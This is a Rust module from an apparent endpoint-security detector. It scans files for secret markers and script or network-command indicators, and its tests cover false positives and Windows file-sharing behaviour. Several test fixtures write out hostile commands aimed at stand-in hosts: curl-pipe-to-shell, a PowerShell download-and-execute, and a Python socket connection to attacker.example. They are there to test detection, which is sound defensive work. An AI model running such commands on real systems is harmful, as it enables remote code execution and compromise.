use crate::vuln_detector_params;
use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;
use std::fs;

/// Open `path` for reading with the maximally permissive Win32 share mode,
/// then read the full body. On non-Windows this is a thin wrapper around
/// `std::fs::read`.
///
/// Why this matters on Windows: the vulnerability detector's content-scan
/// tick momentarily holds a read handle to every candidate path returned by
/// `flodbadd::open_files::get_open_file_paths()` (which on a CI host
/// includes every open file of every L7-attributed `cargo.exe` / `rustc.exe`
/// session, e.g. `target/<profile>/deps/<crate>-<hash>.d`). The default
/// Rust `File::open` share mode on Windows is
/// `FILE_SHARE_READ | FILE_SHARE_WRITE` -- it does NOT permit concurrent
/// `unlink` or `rename`. Cargo's atomic dep-info rewrite path
/// (`x.d.tmp` -> `x.d` -> overwrite) then fails with
/// `os error 32` "process cannot access the file because it is being used
/// by another process", aborting the whole `cargo build`.
///
/// Adding `FILE_SHARE_DELETE` (the third bit) tells the Win32 file-system
/// driver "I do not need to block other processes from deleting or renaming
/// this file while my handle is open". Combined with the upstream
/// build-artifact path filter in
/// [`vuln_detector_params::is_secret_content_scan_excluded_path`], this is
/// the defense-in-depth layer that ensures a content scan can never wedge
/// the build tool that produced the file -- even if a future build-artifact
/// shape slips past the filter.
fn read_file_with_shared_delete(path: &str) -> std::io::Result<Vec<u8>> {
    #[cfg(target_os = "windows")]
    {
        use std::io::Read;
        use std::os::windows::fs::OpenOptionsExt;
        // FILE_SHARE_READ (0x1) | FILE_SHARE_WRITE (0x2) | FILE_SHARE_DELETE (0x4) = 0x7.
        // We hard-code the literal here because the Win32 constants live in
        // `windows::Win32::Storage::FileSystem` which would force pulling
        // an extra cargo feature into the foundation Windows build for a
        // value that has been stable since Windows NT 3.1.
        const SHARE_RWD: u32 = 0x0000_0007;
        let mut file = std::fs::OpenOptions::new()
            .read(true)
            .share_mode(SHARE_RWD)
            .open(path)?;
        let metadata = file.metadata()?;
        let mut buf = Vec::with_capacity(metadata.len() as usize);
        file.read_to_end(&mut buf)?;
        Ok(buf)
    }
    #[cfg(not(target_os = "windows"))]
    {
        fs::read(path)
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SecretContentFileMatch {
    pub path: String,
    pub secret_labels: Vec<String>,
    pub secret_hits: usize,
    pub script_like: bool,
    pub network_command_like: bool,
    // Backward compatibility for older debug traces / corpus JSON that
    // predate EDAMAME generated PowerShell stub attestation.
    #[serde(default)]
    pub edamame_powershell_probe_stub: bool,
}

fn looks_like_edamame_powershell_probe_stub(basename: &str, normalized: &str) -> bool {
    if !basename.ends_with(".ps1") {
        return false;
    }

    let has_edamame_wrapper = normalized.contains("$__edamame_lines")
        && normalized.contains("$__edamame_script")
        && normalized.contains("invoke-expression $__edamame_script");
    if !has_edamame_wrapper {
        return false;
    }

    let has_read_probe = vuln_detector_params::secret_content_powershell_probe_read_verbs()
        .iter()
        .any(|needle| normalized.contains(needle.as_str()));
    if !has_read_probe {
        return false;
    }

    // Only attest read-only assessment probes. Remediation scripts and
    // downloader/execution payloads remain ordinary script-like temp files.
    !vuln_detector_params::secret_content_powershell_dangerous_verbs()
        .iter()
        .any(|needle| normalized.contains(needle.as_str()))
}

pub fn inspect_secret_like_file(path: &str) -> Option<SecretContentFileMatch> {
    // Extension gate FIRST, before any filesystem access. Binary/media files
    // (audio, images, video, archives, compiled artifacts, on-disk media
    // databases) never carry secret text, and probing them under TCC-protected
    // media directories (`~/Music`, `~/Pictures`, `~/Movies`) triggers a macOS
    // privacy consent prompt. Dropping on extension here guarantees no
    // `metadata()` / `open()` on such a candidate regardless of caller.
    if vuln_detector_params::is_secret_content_scan_skipped_extension(path) {
        return None;
    }

    // Excluded-path gate, ALSO before any filesystem access. The upstream
    // candidate collector already filters these, but re-checking here makes
    // the guarantee hold for every caller of this function (and of
    // `scan_secret_like_files`) rather than relying on each caller to
    // pre-filter. Beyond the build-artifact trees this covers macOS
    // media-app library bundles (`.photoslibrary`, `.musiclibrary`, ...):
    // touching a file inside `Photos Library.photoslibrary` triggers the
    // macOS Photos TCC consent prompt, so we must NOT `metadata()` / open()
    // such a candidate. This mirrors the extension gate above -- WHAT the
    // file is vs. WHERE it lives.
    if vuln_detector_params::is_secret_content_scan_excluded_path(path) {
        return None;
    }

    let metadata = fs::metadata(path).ok()?;
    if !metadata.is_file() || metadata.len() == 0 {
        return None;
    }
    if metadata.len() > vuln_detector_params::secret_content_scan_max_bytes() {
        return None;
    }

    let bytes = read_file_with_shared_delete(path).ok()?;
    if bytes.is_empty() {
        return None;
    }

    let contents = String::from_utf8_lossy(&bytes);
    let normalized = contents.to_ascii_lowercase();
    let mut labels = BTreeSet::new();
    let mut secret_hits = 0usize;

    // CloudModel-tunable secret-marker signatures. `mode` controls whether
    // any one marker (`any`) or every marker (`all`) is required; `per_marker`
    // controls whether the `hits` weight is added once on match or once per
    // present marker (the legacy `env`-block shape). Markers and mode are
    // already lowercased by `CveDetectionParams::new_from_json`.
    for signature in vuln_detector_params::secret_content_signatures() {
        if signature.markers.is_empty() {
            continue;
        }
        let matched = if signature.mode == "all" {
            signature
                .markers
                .iter()
                .all(|marker| normalized.contains(marker.as_str()))
        } else {
            signature
                .markers
                .iter()
                .any(|marker| normalized.contains(marker.as_str()))
        };
        if !matched {
            continue;
        }
        if signature.per_marker {
            for marker in &signature.markers {
                if normalized.contains(marker.as_str()) {
                    labels.insert(signature.label.clone());
                    secret_hits += signature.hits;
                }
            }
        } else {
            labels.insert(signature.label.clone());
            secret_hits += signature.hits;
        }
    }

    let basename = path
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(path)
        .trim()
        .to_ascii_lowercase();
    let script_extensions = vuln_detector_params::secret_content_script_extensions();
    let network_command_tokens = vuln_detector_params::secret_content_network_command_tokens();
    let script_like = normalized.starts_with("#!")
        || script_extensions
            .iter()
            .any(|ext| basename.ends_with(ext.as_str()));
    let network_command_like = network_command_tokens
        .iter()
        .any(|needle| normalized.contains(needle.as_str()));
    let edamame_powershell_probe_stub =
        looks_like_edamame_powershell_probe_stub(&basename, &normalized);

    Some(SecretContentFileMatch {
        path: path.to_string(),
        secret_labels: labels.into_iter().collect(),
        secret_hits,
        script_like,
        network_command_like,
        edamame_powershell_probe_stub,
    })
}

/// Batched scan used by the vulnerability detector tick. Returns every signal
/// that carries at least one indicator the detector may promote:
///   - `secret_hits >= secret_content_min_hits` (primary sensitive-material
///     signal used by `sensitive_material_egress`)
///   - `script_like` (used by FIM temp-mutation heuristic)
///   - `network_command_like` (used by FIM temp-mutation heuristic)
///
/// Per-check thresholds are enforced downstream in the detector; the batch
/// scanner intentionally avoids dropping low-hits-but-script-like signals so
/// the FIM pipeline keeps parity with the synchronous in-process path.
pub fn scan_secret_like_files(paths: &[String]) -> Vec<SecretContentFileMatch> {
    let mut unique_paths = BTreeSet::new();
    let mut matches = Vec::new();
    let min_hits = vuln_detector_params::secret_content_min_hits();

    for path in paths {
        let trimmed = path.trim();
        if trimmed.is_empty() || !unique_paths.insert(trimmed.to_string()) {
            continue;
        }
        let Some(signal) = inspect_secret_like_file(trimmed) else {
            continue;
        };
        let has_indicator =
            signal.secret_hits >= min_hits || signal.script_like || signal.network_command_like;
        if !has_indicator {
            continue;
        }
        matches.push(signal);
    }

    matches
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::env;
    use std::sync::atomic::{AtomicUsize, Ordering};

    fn unique_path(base: &str, suffix: &str) -> String {
        static COUNTER: AtomicUsize = AtomicUsize::new(0);
        let n = COUNTER.fetch_add(1, Ordering::Relaxed);
        let pid = std::process::id();
        env::temp_dir()
            .join(format!("edamame_secret_scan_test_{base}_{pid}_{n}{suffix}"))
            .to_string_lossy()
            .to_string()
    }

    fn write_temp(path: &str, body: &str) {
        std::fs::write(path, body).expect("write tmp file");
    }

    fn cleanup(path: &str) {
        let _ = std::fs::remove_file(path);
    }

    /// FP-MAC-6 reproducer: a benign `.log` file containing a git error
    /// with a bare `https://github.com/...` URL must NOT trip the
    /// `network_command_like` heuristic. Before the CloudModel-tunable
    /// default, bare `https://` substring matched here and promoted the
    /// downstream `file_system_tampering` finding to HIGH on
    /// `kralizec-3.local` 1.3.3.
    #[test]
    fn url_in_git_error_log_does_not_trip_network_command_like() {
        let path = unique_path("git_error", ".log");
        let body = "fatal: unable to access 'https://github.com/edamametechnologies/foo/': \
                    Could not resolve host: github.com\n";
        write_temp(&path, body);
        let scan = inspect_secret_like_file(&path).expect("scan");
        assert!(
            !scan.network_command_like,
            "bare URL in git error log must not be network-command-like (got: {scan:?})"
        );
        assert!(
            !scan.script_like,
            "benign .log must not be script-like (got: {scan:?})"
        );
        cleanup(&path);
    }

    /// FP-MAC-6 reproducer: an OpenSSH warning text file containing
    /// `https://openssh.com/pq.html` must NOT trip `network_command_like`.
    /// Same shape as the git-error case but `.txt` suffix.
    #[test]
    fn openssh_warning_url_in_txt_does_not_trip_network_command_like() {
        let path = unique_path("openssh_warning", ".txt");
        let body = "Connection from FOOBAR ... see https://openssh.com/pq.html\n";
        write_temp(&path, body);
        let scan = inspect_secret_like_file(&path).expect("scan");
        assert!(
            !scan.network_command_like,
            "bare URL in OpenSSH warning text must not be network-command-like (got: {scan:?})"
        );
        cleanup(&path);
    }

    /// The extension gate MUST drop binary/media candidates before any
    /// content read. A `.mp3` file whose bytes happen to contain
    /// script-like / secret-like text (which real media files can, via
    /// embedded metadata) must return `None` -- the scanner never opens it.
    /// This is the TCC-prompt fix for media assets held open under
    /// `~/Music` / `~/Pictures` / `~/Movies`.
    #[test]
    fn media_extension_is_skipped_before_read() {
        let path = unique_path("fake_media", ".mp3");
        // Content that WOULD be flagged if it were scanned as text.
        write_temp(
            &path,
            "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n",
        );
        let scan = inspect_secret_like_file(&path);
        assert!(
            scan.is_none(),
            "media-extension file must be skipped by the extension gate (got: {scan:?})"
        );
        cleanup(&path);
    }

    /// TCC regression guard (macOS Photos prompt): a file INSIDE a media-app
    /// library bundle (`Photos Library.photoslibrary`) MUST be skipped by the
    /// excluded-path gate BEFORE any filesystem read, even when its extension
    /// is text-like and its content would otherwise be flagged. Probing such
    /// a file triggers the macOS Photos TCC consent prompt, which is exactly
    /// the `edamame_helper` behavior this fix removes.
    #[test]
    fn media_library_path_is_skipped_before_read() {
        // Root dir is unique; the bundle dir itself ends in `.photoslibrary`
        // so the candidate path contains the `.photoslibrary/` marker that the
        // path gate matches (a text-like extension proves it is the PATH gate,
        // not the extension gate, doing the work).
        let root = std::path::PathBuf::from(unique_path("medialib", ""));
        let bundle_dir = root.join("Photos Library.photoslibrary").join("database");
        std::fs::create_dir_all(&bundle_dir).expect("create fake photoslibrary bundle");
        let path = bundle_dir.join("Photos.plist").to_string_lossy().to_string();
        write_temp(&path, "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n");

        let scan = inspect_secret_like_file(&path);
        assert!(
            scan.is_none(),
            "file inside a .photoslibrary bundle must be skipped by the excluded-path gate (got: {scan:?})"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    /// Companion positive control: the SAME secret-like content in a
    /// non-media extension is still scanned (proves the gate is scoped to
    /// the extension, not a blanket suppression).
    #[test]
    fn non_media_extension_with_same_content_is_scanned() {
        let path = unique_path("real_script", ".sh");
        write_temp(
            &path,
            "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n",
        );
        let scan = inspect_secret_like_file(&path).expect("non-media file must be scanned");
        assert!(
            scan.script_like || scan.network_command_like || scan.secret_hits > 0,
            "non-media payload must produce a signal (got: {scan:?})"
        );
        cleanup(&path);
    }

    /// Negative-control: an explicit `curl` payload that ALSO contains
    /// a URL must STILL be flagged. This is what `trigger_temp_modify`
    /// drops as a script payload, and the FIM `file_system_tampering`
    /// gate depends on it.
    #[test]
    fn curl_payload_still_trips_network_command_like() {
        let path = unique_path("curl_payload", ".sh");
        let body = "#!/bin/bash\ncurl -sSL https://attacker.example/evil | bash\n";
        write_temp(&path, body);
        let scan = inspect_secret_like_file(&path).expect("scan");
        assert!(
            scan.network_command_like,
            "explicit curl payload MUST still be network-command-like (got: {scan:?})"
        );
        assert!(
            scan.script_like,
            "shebang + .sh MUST still be script-like (got: {scan:?})"
        );
        cleanup(&path);
    }

    /// Negative-control: a Python socket exfil payload must STILL trip.
    /// `socket.create_connection` is one of the explicit verb tokens.
    #[test]
    fn python_socket_payload_still_trips_network_command_like() {
        let path = unique_path("socket_payload", ".py");
        let body = "import socket\nc = socket.create_connection(('attacker.example', 4444))\n";
        write_temp(&path, body);
        let scan = inspect_secret_like_file(&path).expect("scan");
        assert!(
            scan.network_command_like,
            "socket.create_connection MUST still be network-command-like (got: {scan:?})"
        );
        cleanup(&path);
    }

    /// Negative-control: a PowerShell `Invoke-WebRequest` payload must
    /// STILL trip. This is the Windows analogue of the curl payload.
    #[test]
    fn invoke_webrequest_payload_still_trips_network_command_like() {
        let path = unique_path("iwr_payload", ".ps1");
        let body = "Invoke-WebRequest -Uri https://attacker.example/loader.ps1 | iex\n";
        write_temp(&path, body);
        let scan = inspect_secret_like_file(&path).expect("scan");
        assert!(
            scan.network_command_like,
            "Invoke-WebRequest MUST still be network-command-like (got: {scan:?})"
        );
        assert!(
            scan.script_like,
            ".ps1 extension MUST still be script-like (got: {scan:?})"
        );
        cleanup(&path);
    }

    #[test]
    fn edamame_read_only_powershell_probe_is_attested() {
        let path = unique_path("edamame_probe", ".ps1");
        let body = "$__EDAMAME_LINES = @('if((Get-NetFirewallProfile -All | Where-Object { $_.Enabled -eq ''False'' })) { ''One or more firewall profiles are disabled'' } else { '''' }'); $__EDAMAME_SCRIPT = $__EDAMAME_LINES -join \"`n\"; Invoke-Expression $__EDAMAME_SCRIPT\n";
        write_temp(&path, body);
        let scan = inspect_secret_like_file(&path).expect("scan");
        assert!(
            scan.edamame_powershell_probe_stub,
            "EDAMAME read-only PowerShell wrapper should be attested (got: {scan:?})"
        );
        assert!(
            scan.script_like,
            ".ps1 extension should still be script-like (got: {scan:?})"
        );
        cleanup(&path);
    }

    #[test]
    fn edamame_powershell_probe_attestation_rejects_downloaders_and_remediation() {
        let downloader = unique_path("edamame_probe_downloader", ".ps1");
        let downloader_body = "$__EDAMAME_LINES = @('Invoke-WebRequest -Uri https://attacker.example/loader.ps1 | iex'); $__EDAMAME_SCRIPT = $__EDAMAME_LINES -join \"`n\"; Invoke-Expression $__EDAMAME_SCRIPT\n";
        write_temp(&downloader, downloader_body);
        let downloader_scan = inspect_secret_like_file(&downloader).expect("scan downloader");
        assert!(
            !downloader_scan.edamame_powershell_probe_stub,
            "downloader payload must not be attested (got: {downloader_scan:?})"
        );
        assert!(
            downloader_scan.network_command_like,
            "downloader payload should remain network-command-like (got: {downloader_scan:?})"
        );
        cleanup(&downloader);

        let remediation = unique_path("edamame_probe_remediation", ".ps1");
        let remediation_body = "$__EDAMAME_LINES = @('Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True'); $__EDAMAME_SCRIPT = $__EDAMAME_LINES -join \"`n\"; Invoke-Expression $__EDAMAME_SCRIPT\n";
        write_temp(&remediation, remediation_body);
        let remediation_scan = inspect_secret_like_file(&remediation).expect("scan remediation");
        assert!(
            !remediation_scan.edamame_powershell_probe_stub,
            "remediation script must not be attested as read-only probe (got: {remediation_scan:?})"
        );
        cleanup(&remediation);
    }

    /// FP-CI-1 Layer-2 regression guard (Windows only): while the secret
    /// content scanner has the file open via `read_file_with_shared_delete`,
    /// the file MUST remain renameable / unlinkable from the same process.
    /// This is what guarantees we never wedge a producing build tool
    /// (cargo, rustc, link.exe, ...) by holding the file open without
    /// `FILE_SHARE_DELETE`. We approximate the producer-side `rename`
    /// pattern by opening the file with `OpenOptions::share_mode(SHARE_RWD)`
    /// (the same mode the scanner uses) and then renaming it from another
    /// open handle, asserting that the rename succeeds.
    ///
    /// On non-Windows targets this is irrelevant (POSIX rename always works
    /// regardless of open file handles), so the test is gated to Windows.
    #[cfg(target_os = "windows")]
    #[test]
    fn open_for_read_does_not_block_rename_on_windows() {
        use std::io::Read;
        use std::os::windows::fs::OpenOptionsExt;

        let path = unique_path("share_delete_probe", ".d");
        // A short, plausibly-build-artifact-shaped payload; 64-byte body
        // is large enough that the read goes through the open-then-read
        // path rather than a synthetic empty-file shortcut.
        let body =
            "quick_error-9b6e3a7c2d4f1a08.rmeta: src/lib.rs src/error.rs build.rs\n".repeat(8);
        write_temp(&path, &body);

        // Open the file the way the scanner does -- this is the handle
        // that, with the WRONG share mode, would block the rename below
        // with `os error 32`.
        let mut scanner_handle = std::fs::OpenOptions::new()
            .read(true)
            .share_mode(0x0000_0007) // FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
            .open(&path)
            .expect("scanner open with SHARE_RWD must succeed");

        // While the scanner handle is open, attempt the producer-side
        // atomic rename. Without FILE_SHARE_DELETE on the scanner handle
        // this fails with `os error 32`; with it, it MUST succeed.
        let renamed = format!("{}.renamed", &path);
        std::fs::rename(&path, &renamed)
            .expect("rename MUST succeed while scanner handle is open with FILE_SHARE_DELETE");

        // The scanner handle still works post-rename.
        let mut scanned = Vec::new();
        scanner_handle
            .read_to_end(&mut scanned)
            .expect("scanner read MUST succeed post-rename");
        assert_eq!(scanned.len(), body.len());

        cleanup(&renamed);
    }
}
